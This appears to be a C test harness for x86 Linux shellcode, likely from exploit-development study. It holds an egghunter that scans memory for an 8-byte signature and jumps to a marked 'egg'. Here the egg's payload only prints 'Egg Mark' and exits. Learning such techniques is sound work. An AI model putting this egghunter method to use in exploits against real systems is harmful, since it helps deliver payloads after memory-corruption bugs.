#include <stdio.h>
#include <string.h>

unsigned char egg[] = \

              // Write "Egg Mark" and exit

              "\x90\x50\x90\x50"   // <- First Four Bytes of Signature
              "\x90\x50\x90\x50"   // <- Same first bytes are mandatory
              "\x31\xdb"
              "\xf7\xe3\xb0\x04\x6a\x0a\x68\x4d\x61\x72"
              "\x6b\x68\x45\x67\x67\x20\x4d\x61\x72\x6b"
              "\xb2\x09\xcd\x80\xb0\x01\xcd\x80";  //EMark

              unsigned char egghunter[] = \

              // Search for the Egg Signature (0x50905090 x 2) - the Egg's 8 first instructions (nop, push eax, nop, push eax...)

              "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f"
              "\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c"
              "\xf2\x74\xee\xb8"
              "\x90\x50\x90\x50"   // <- Signature
              "\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(egghunter));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Setting the egg hunter signature to search (byte reverse order)

            "movl $0x50905090, (egghunter+24)\n\t"

            // Calling the shellcode
            "call egghunter");

}


